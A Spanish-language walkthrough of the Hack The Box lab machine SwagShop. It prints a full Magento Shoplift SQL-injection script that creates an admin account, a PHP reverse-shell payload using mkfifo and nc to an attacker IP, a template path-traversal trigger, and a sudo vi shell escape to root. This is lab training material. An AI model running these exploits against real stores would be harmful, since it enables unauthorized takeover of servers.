---
title: Hack The Box SwagShop
author: k4miyo
date: 2022-02-27
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Linux]
tags: [SQL, SQLi]
ping: true
---

## SwagShop
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.140.

```bash
❯ ping -c 1 10.10.10.140
PING 10.10.10.140 (10.10.10.140) 56(84) bytes of data.
64 bytes from 10.10.10.140: icmp_seq=1 ttl=63 time=136 ms

--- 10.10.10.140 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 136.377/136.377/136.377/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.140 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-13 21:50 CST
Initiating Ping Scan at 21:50
Scanning 10.10.10.140 [4 ports]
Completed Ping Scan at 21:50, 0.16s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:50
Scanning 10.10.10.140 [65535 ports]
Discovered open port 22/tcp on 10.10.10.140
Discovered open port 80/tcp on 10.10.10.140
Completed SYN Stealth Scan at 21:50, 38.89s elapsed (65535 total ports)
Nmap scan report for 10.10.10.140
Host is up (0.14s latency).
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 39.19 seconds
           Raw packets sent: 69636 (3.064MB) | Rcvd: 69234 (2.769MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.140
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80 10.10.10.140 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-13 21:51 CST
Nmap scan report for 10.10.10.140
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://swagshop.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds
```

Observamos que el se tiene le puerto 80 abierto, por lo que antes de ver el contenido vía web, vamos a hacer uso de la herramienta `whatweb`:

```bash
❯ whatweb http://10.10.10.140/
http://10.10.10.140/ [302 Found] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.140], RedirectLocation[http://swagshop.htb/]
ERROR Opening: http://swagshop.htb/ - no address for swagshop.htb
```

Aquí vemos que se presenta un redirect hacia el dominio **swagshop.htb**; por lo tanto sabemos que se debería aplicar ***Virtual Hosting*** y tenemos que agregarlo a nuestro archivo `/etc/hosts` y posteriormente tratar de ejecutar nuevamente la herramienta `whatweb` y despúes lo vemos vía web.

```bash
❯ whatweb http://10.10.10.140/
http://10.10.10.140/ [302 Found] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.140], RedirectLocation[http://swagshop.htb/]
http://swagshop.htb/ [200 OK] Apache[2.4.18], Cookies[frontend], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[frontend], IP[10.10.10.140], JQuery[1.10.2], Magento, Modernizr, Prototype, Script[text/javascript], Scriptaculous, Title[Home page], X-Frame-Options[SAMEORIGIN]
```

![""](/assets/images/htb-swagshop/swagshop-web.png)

Vemos que nos enfrentamos ante un ***Magento***; por lo tanto, vamos a tratar de buscar si existen exploits públicos relacionados:

```bash
❯ searchsploit magento remote code
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                   | php/webapps/37811.py
Magento eCommerce - Remote Code Execution                                                      | xml/webapps/37977.py
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Tenemos dos relacionados con la ejecución de comandos, uno autenticado y el otro podríamos pensar que no necesitamos contar con credenciales, así que le echamos un ojito al segundo a ver que nos dice.

```bash
❯ searchsploit -m xml/webapps/37977.py
  Exploit: Magento eCommerce - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/37977
     Path: /usr/share/exploitdb/exploits/xml/webapps/37977.py
File Type: ASCII text

Copied to: /home/k4miyo/Documentos/HTB/SwagShop/content/37977.py


❯ mv 37977.py magento_rce.py
```

Analizando un poco el exploits, vamos a retocarlo para que nos funciones; primeramente eliminando los comentarios que tienen `/`, despúes validamos si el recurso `/admin/Cms_Wysiwyg/directive/index/` existe para nuestro caso.

![""](/assets/images/htb-swagshop/swagshop-web1.png)

Pensando un poco, vemos que nuestra página presenta la dirección URL `http://swagshop.htb/index.php/`; por lo tanto podríamos agregar el `/admin/` despúes del `/index.php`:

![""](/assets/images/htb-swagshop/swagshop-web2.png)

Nos encontramos con el panel de administración de ***Magento*** y de acuerdo con lo que dice el exploit, nos crea las credenciales **forme:forme**; las cuales podemos cambiar a las que nosotros queramos. Por lo tanto, el script nos quedaría de la siguiente forma:

```python
##################################################################################################
#Exploit Title : Magento Shoplift exploit (SUPEE-5344)
#Author        : Manish Kishan Tanwar AKA error1046
#Date          : 25/08/2015
#Love to       : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,Jagriti,Kishan Singh and ritu rathi
#Debugged At  : Indishell Lab(originally developed by joren)
##################################################################################################

import requests
import base64
import sys

target = "http://swagshop.htb/index.php"

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/admin/Cms_Wysiwyg/directive/index/"

q="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""


query = q.replace("\n", "").format(username="k4miyo", password="k4miyo123")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
r = requests.post(target_url,
                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter),
                        "forwarded": 1})
if r.ok:
    print "WORKED"
    print "Check {0}/admin with creds k4miyo:k4miyo123".format(target)
else:
    print "DID NOT WORK"
```

Lo ejecutamos:

```bash
❯ python2 magento_rce.py
WORKED
Check http://swagshop.htb/index.php/admin with creds k4miyo:k4miyo123
```

De acuerdo con esto, deberíamos acceder al panel de administración con las credenciales **k4miyo:k4miyo123**, así que vamos a probar.

![""](/assets/images/htb-swagshop/swagshop-web3.png)

Hemos ingresado al panel de administración y recordando los exploits que encontramos, existe otro que nos permite la ejecución de comandos si contamos con credenciales válidas de acceso. Para este caso, vamos a hacerlo de manera manual, por lo tanto, lo primero que debemos hacer es ir a **System > Configuration**.

![""](/assets/images/htb-swagshop/swagshop-web4.png)

Del panel de configuración del lado izquierdo, nos vamos hasta abajo y seleccionamos **Advanced > Developer**.

![""](/assets/images/htb-swagshop/swagshop-web5.png)

En el apartado de **Templete Settings** vamos a cambiar el valor **Allow Symlinks** de **No** a **Yes** y guardamos los cambios.

![""](/assets/images/htb-swagshop/swagshop-web6.png)

Ahora vamos a crear una nueva categoría en **Catalog > Manage Categories**. 
- **Name**: Lo que nosotros queramos, para este caso vamos a ponerle K4miShell.
- **Is Active**: Lo cambiamos a **Yes**.
- **Thumbnail Image**: Vamos a subir un archivo de nombre **shell.php.png** cuyo contenido nos ayude a entablarnos una reverse shell.

```php
<?php
  passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 443 >/tmp/f")
?>
```

Y guardamos los cambios.

![""](/assets/images/htb-swagshop/swagshop-web7.png)

Ahora vamos a darle click secundario en el hipervínculo donde se encuentra nuestra imagen y nos vamos a quedar con la parte de `/media/catalog/category/shell.php.png`, ya que dicho recurso existe a nivel de sistema. Ahora nos falta hacer un llamado a nuestro archivo para que se ejecute, esto lo logramos en la sección **Newsletter > Newsletter Templates**.

![""](/assets/images/htb-swagshop/swagshop-web8.png)

Agregamos un nuevo template en **Add New Template** modificando los siguiente parámetros:
- **Template Name**: Lo que nosotros queramos, para este caso Shell.
- **Template Subject**: Lo que nosotros queramos, para este caso Shell.
- **Template Content**: Borramos lo que contiene y escribimos lo siguiente:

**\{\{block type='core/template' template='../../../../../..//media/catalog/category/shell.php.png'\}\}**

![""](/assets/images/htb-swagshop/swagshop-web9.png)

Antes de darle en la parte de **Preview Template** vamos a ponernos en escucha por el puerto 443:

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.140] 37154
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Ya tenemos acceso a la máquina y para trabajar más comodos, vamos a hacer un [Tratamiento de la tty](/posts/tratamiento-tty). Si accemos a la carpeta del usuario **haris** vemos que podemos visualizar la flag (user.txt); asi que ahora vamos a enumerar un poco el sistema para ver de que forma nos convertimos en **root**.

```bash
www-data@swagshop:/home/haris$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@swagshop:/home/haris$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
www-data@swagshop:/home/haris$
```

Vemos que podemos ejecutar `/usr/bin/vi /var/www/html/*` como el usuario **root** sin proporcionar contraseña; por lo tanto podriamos abrir un recurso cualquier, es decir, poner lo que nos de la gana bajo `/var/www/html/` y luego ejecutar lo siguiente:

```bash
www-data@swagshop:/home/haris$ sudo vi /var/www/html/k4mishell
```

- **ESC** y ponemos: `:set shell=/bin/bash`; con esto declaramos una variable que se llama `shell` y cuyo valor es `/bin/bash`.
- **ESC** y ponemos: `shell`; con esto llamamos a nuestra variable que nos va a ejecutar una `/bin/bash` como el usuario **root**.

```bash
www-data@swagshop:/var/www/html$ sudo vi /var/www/html/k4mishell

root@swagshop:/var/www/html# whoami
root
root@swagshop:/var/www/html#
```

La otra forma y para no complicarnos, podriamos ocupar el parámetro `-c`:

```bash
www-data@swagshop:/var/www/html$ sudo vi /var/www/html/k4mishell -c '!/bin/bash'

root@swagshop:/var/www/html# whoami
root
root@swagshop:/var/www/html#
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).
